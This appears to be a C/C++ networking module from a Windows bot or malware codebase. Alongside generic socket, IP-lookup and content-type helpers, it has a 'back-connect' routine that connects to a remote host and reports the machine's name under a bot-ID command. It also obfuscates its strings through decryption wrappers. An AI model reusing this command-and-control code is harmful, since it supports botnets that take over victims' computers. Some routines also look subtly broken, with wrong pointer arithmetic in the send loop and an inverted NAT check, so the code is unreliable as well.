#include <winsock2.h>
#include "sys_includes.h"
#include <shlwapi.h>
#include <ws2tcpip.h>
#include <iphlpapi.h>

#include "syslib\mem.h"
#include "syslib\net.h"
#include "syslib\str.h"
#include "net.h"

#include "syslib\strcrypt.h"
#include "str_crx.h"

SYSLIBFUNC(BOOL) NetIsConnectionEstablished(LPCSTR lpAddress,WORD wPort)
{
    BOOL bRet=false;
    PMIB_TCPTABLE lpTcpTable=NULL;

    do
    {
        if ((!lpAddress) || (!wPort))
            break;

        DWORD dwAddr=inet_addr(lpAddress);
        if (!dwAddr)
            break;

        DWORD dwSize=0,dwError=GetTcpTable(NULL,&dwSize,TRUE);
        if (dwError == ERROR_INSUFFICIENT_BUFFER)
        {
            lpTcpTable=(PMIB_TCPTABLE)MemQuickAlloc(dwSize);
            if (!lpTcpTable)
                break;

            dwError=GetTcpTable(lpTcpTable,&dwSize,TRUE);
        }

        if (!lpTcpTable)
            break;

        if ((dwError != NO_ERROR) || (!lpTcpTable->dwNumEntries))
        {
            bRet=true;
            break;
        }
        wPort=htons(wPort);
        for (DWORD i=0; i < lpTcpTable->dwNumEntries; i++)
        {
            if ((lpTcpTable->table[i].dwRemoteAddr == dwAddr) && (lpTcpTable->table[i].dwRemotePort == wPort) && (lpTcpTable->table[i].State == MIB_TCP_STATE_ESTAB))
            {
                bRet=true;
                break;
            }
        }
    }
    while (false);
    if (lpTcpTable)
        MemFree(lpTcpTable);

    return bRet;
}

SYSLIBFUNC(UINT) NetResolveAddress(LPCSTR lpHost)
{
    UINT dwAddr=inet_addr(lpHost);
    if (dwAddr == INADDR_NONE)
    {
        hostent *hp;
        if (hp=gethostbyname(lpHost))
            dwAddr=*(unsigned long *)hp->h_addr;
    }
    return dwAddr;
}

SYSLIBFUNC(LPCSTR) NetNtoA(int iAddr)
{
    in_addr addr;
    addr.s_addr=iAddr;
    return inet_ntoa(addr);
}

static bool NetSelect(SOCKET hSock,int dwTimeout)
{
    bool bRet=false;
    do
    {
        int wsaerrno = WSAGetLastError();
        if (wsaerrno == WSAEINTR)
        {
            bRet=true;
            break;
        }

        if (wsaerrno != WSAEWOULDBLOCK)
            break;

        fd_set fds;
        FD_ZERO(&fds);
        FD_SET(hSock, &fds);

        timeval tv,*ptv=&tv;
        tv.tv_sec=dwTimeout/1000;
        tv.tv_usec=(dwTimeout%1000)*1000;
        if (dwTimeout == INFINITE)
            ptv=NULL;
        bRet=(select(hSock+1,&fds,NULL,&fds,ptv) > 0);
    }
    while (false);
    return bRet;
}

SYSLIBFUNC(BOOL) NetRecvTimeoutUDP(SOCKET hSock,LPSTR lpData,int dwLen,int dwTimeout,sockaddr *lpClient)
{
    sockaddr saClient;

    if (!SYSLIB_SAFE::CheckParamWrite(lpData,dwLen))
        return false;

    if (!SYSLIB_SAFE::CheckParamWrite(lpClient,sizeof(*lpClient)))
        lpClient=&saClient;

    while (dwLen > 0)
    {
        int dwSize=sizeof(*lpClient),
            n=recvfrom(hSock,lpData,dwLen,0,lpClient,&dwSize);
        if (n > 0)
        {
            lpData+=n;
            dwLen-=n;
        }
        else if (!n)
            break;
        else
        {
            if (!NetSelect(hSock,dwTimeout))
                break;
        }
    }
    return (!dwLen);
}

SYSLIBFUNC(BOOL) NetRecvTimeout(SOCKET hSock,LPSTR lpData,int dwLen,int dwTimeout)
{
    if (!SYSLIB_SAFE::CheckParamWrite(lpData,dwLen))
        return false;

    while (dwLen > 0)
    {
        int n=recv(hSock,lpData,dwLen,0);
        if (n > 0)
        {
            lpData+=n;
            dwLen-=n;
        }
        else if (!n)
            break;
        else
        {
            if (!NetSelect(hSock,dwTimeout))
                break;
        }
    }
    return (!dwLen);
}

SYSLIBFUNC(BOOL) NetRecvToNull(SOCKET hSock,int dwLen,int dwTimeout)
{
    while (dwLen--)
    {
        char bTmp;
        if (!NetRecvTimeout(hSock,&bTmp,sizeof(bTmp),dwTimeout))
            return false;
    }
    return true;
}

SYSLIBFUNC(BOOL) NetSendAll(SOCKET hSock,LPVOID lpData,int dwLen)
{
    if (!SYSLIB_SAFE::CheckParamRead(lpData,dwLen))
        return false;

    BOOL bRet=true;
	int dwCurLen=0;
	do
	{
		dwCurLen=send(hSock,(char*)lpData,dwLen,0);
		if(dwCurLen >= 0)
		{
			dwLen-=dwCurLen;
			lpData=(SIZE_T*)lpData+dwCurLen;
		}
		else
        {
            bRet=false;
            break;
        }
	}
	while(dwLen > 0);
	return bRet;
}

SYSLIBFUNC(SOCKET) NetConnectToTcpAddr(LPCSTR lpHost,WORD wPort)
{
    SOCKET hSock=INVALID_SOCKET;

    do
    {
        if ((hSock=socket(AF_INET,SOCK_STREAM,IPPROTO_TCP)) != INVALID_SOCKET)
        {
            sockaddr_in siAddr={0};
            siAddr.sin_family=AF_INET;
            siAddr.sin_port=htons(wPort);
            siAddr.sin_addr.s_addr=NetResolveAddress(lpHost);

            if (connect(hSock,(sockaddr *)&siAddr,(sizeof(siAddr))) == SOCKET_ERROR)
            {
                NetCloseSocket(hSock);
                hSock=INVALID_SOCKET;
                break;
            }
        }
    }
    while (false);

    return hSock;
}

static bool NetBCWriteCommand(SOCKET hSock,byte bCmd,WORD wSize,byte *lpData)
{
    BC_COMMAND cmd={0};
    cmd.wStructSize=sizeof(cmd);
    cmd.wDataSize=wSize;
    cmd.bCommand=bCmd;
    bool bRet=false;
    if (NetSendAll(hSock,&cmd,sizeof(cmd)))
        bRet=((wSize == 0) || (NetSendAll(hSock,lpData,wSize)));
    return bRet;
}

SYSLIBFUNC(SOCKET) NetBCConnect(LPCSTR lpHost,WORD wBcPort,WORD *lpClPort)
{
    SOCKET hSock=NetConnectToTcpAddr(lpHost,wBcPort);
    if (hSock != INVALID_SOCKET)
    {
        do
        {
            DWORD dwOne=1;
            if (!setsockopt(hSock,IPPROTO_TCP,TCP_NODELAY,(char *)&dwOne,sizeof(dwOne)))
            {
                char szHost[256];
                DWORD wHostSize=255;
                GetComputerNameA(szHost,&wHostSize);

                if (NetBCWriteCommand(hSock,COMMAND_BOTID,wHostSize,(byte*)szHost))
                {
                    WORD wPort=NULL;
                    if (NetRecvTimeout(hSock,(char*)&wPort,sizeof(wPort),SOCKET_TIMEOUT))
                    {
                        if (lpClPort)
                            *lpClPort=wPort;
                        break;
                    }
                }

                NetCloseSocket(hSock);
                hSock=INVALID_SOCKET;
            }
        }
        while (false);
    }
    return hSock;
}

SYSLIBFUNC(SOCKET) NetListen(WORD wPort)
{
    SOCKET hSock=socket(AF_INET,SOCK_STREAM,0);
    if (hSock != INVALID_SOCKET)
    {
        sockaddr_in siAddr={0};
        siAddr.sin_family=AF_INET;
        siAddr.sin_addr.s_addr=INADDR_ANY;
        siAddr.sin_port=htons(wPort);
        do
        {
            if (!bind(hSock,(sockaddr *)&siAddr,sizeof(siAddr)))
            {
                if (!listen(hSock,SOMAXCONN))
                    break;
            }
            NetCloseSocket(hSock);
            hSock=INVALID_SOCKET;
        }
        while (false);
    }
    return hSock;
}

SYSLIBFUNC(void) NetCloseSocket(SOCKET hSock)
{
    shutdown(hSock,SD_BOTH);
    closesocket(hSock);
    return;
}

static bool NetGetAnswer(LPCTSTR lpUrl,LPSTR lpAnswer,DWORD dwSize)
{
    bool bRet=false;

    REQUEST_RESULT Result;
    Result.dwResultFlags=INET_RESULT_FLAG_READ_RESPONSE;
    HANDLE hSession=InetCreateSession(NULL,HTTP_1_1,INET_PROXY_AUTO,NULL,INET_SESSION_FLAG_DONT_SAVE_NEW_COOKIES|INET_SESSION_FLAG_NO_CACHE_WRITE|INET_SESSION_FLAG_NO_CACHE_READ);
    if (hSession)
    {
        if (InetCallUrl(hSession,lpUrl,HTTP_METHOD_GET,NULL,&Result,INET_REQUEST_FLAG_NO_COOKIES))
        {
            memcpy(lpAnswer,Result.lpResponse,min(dwSize,Result.dwResponseSize));
            MemFree(Result.lpResponse);
            bRet=true;
        }
        InetCloseHandle(hSession);
    }

    return bRet;
}

SYSLIBFUNC(DWORD) NetGetWanIP()
{
    DWORD dwIP=0;
    char szAnswer[250];

    do
    {
        if (NetGetAnswer(dcr_cb8e577e("http://ifconfig.me/ip"),szAnswer,ARRAYSIZE(szAnswer)))
        {
            dwIP=NetResolveAddress(szAnswer);
            if (dwIP != INADDR_NONE)
                break;
        }

        if (NetGetAnswer(dcr_0b6dce0e("http://icanhazip.com/"),szAnswer,ARRAYSIZE(szAnswer)))
        {
            dwIP=NetResolveAddress(szAnswer);
            if (dwIP != INADDR_NONE)
                break;
        }

        if (!NetGetAnswer(dcr_4124ebbe("http://checkip.dyndns.org/"),szAnswer,ARRAYSIZE(szAnswer)))
            break;

        LPSTR lpPtr=StrChrA(szAnswer,':');
        if (!lpPtr)
            break;

        lpPtr+=2;
        dwIP=NetResolveAddress(lpPtr);
    }
    while (false);
    return dwIP;
}

SYSLIBFUNC(DWORD) NetGetExternalIP()
{
    DWORD dwIP=INADDR_NONE;
    sockaddr_in srv_addr={0};
    srv_addr.sin_family=AF_INET;
    srv_addr.sin_port=htons(80);
    srv_addr.sin_addr.s_addr=NetResolveAddress(dcrA_4d869894("www.update.microsoft.com"));

    SOCKET hSock=socket(AF_INET,SOCK_STREAM,0);
    if (hSock != INVALID_SOCKET)
    {
        if (!connect(hSock,(sockaddr *)&srv_addr,sizeof(srv_addr)))
        {
            sockaddr_in my_addr={0};
            int dwLen=sizeof(my_addr);
            getsockname(hSock,(sockaddr*)&my_addr,&dwLen);
            dwIP=my_addr.sin_addr.S_un.S_addr;
        }
        NetCloseSocket(hSock);
    }
    return dwIP;
}

SYSLIBFUNC(LPCWSTR) NetGetFileContentTypeW(LPCWSTR lpFileName)
{
    LPWSTR lpType=NULL;
    if (lpFileName)
    {
        LPCWSTR p=lpFileName+lstrlenW(lpFileName);
        while ((*p != L'.') && (p != lpFileName))
            p--;

        HKEY hKey;
        if (RegOpenKeyExW(HKEY_CLASSES_ROOT,p,0,KEY_QUERY_VALUE,&hKey) == ERROR_SUCCESS)
        {
            do
            {
                DWORD dwContentTypeSize=0;
                if (RegQueryValueExW(hKey,dcrW_061662c7("Content Type"),NULL,NULL,NULL,&dwContentTypeSize) != ERROR_SUCCESS)
                    break;

                lpType=(WCHAR*)MemQuickAlloc(dwContentTypeSize+1);
                if (!lpType)
                    break;

                if (RegQueryValueExW(hKey,dcrW_061662c7("Content Type"),NULL,NULL,(byte*)lpType,&dwContentTypeSize) != ERROR_SUCCESS)
                {
                    MemFree(lpType);
                    lpType=NULL;
                    break;
                }
            }
            while (false);
            RegCloseKey(hKey);
        }

        if (!lpType)
            lpType=StrDuplicateW(dcrW_9ef781dc("application/octet-stream"),0);
    }
    return lpType;
}

SYSLIBFUNC(LPCSTR) NetGetFileContentTypeA(LPCSTR lpFileName)
{
    char *lpType=NULL;
    LPWSTR lpFileNameW=StrAnsiToUnicodeEx(lpFileName,0,NULL),
           lpTypeW=(LPWSTR)NetGetFileContentTypeW(lpFileNameW);

    MemFree(lpFileNameW);

    if (lpTypeW)
    {
        lpType=StrUnicodeToAnsiEx(lpTypeW,0,NULL);
        MemFree(lpTypeW);
    }
    return lpType;
}

SYSLIBFUNC(BOOL) NetIsBehindNAT()
{
    return (NetGetWanIP() == NetGetExternalIP());
}

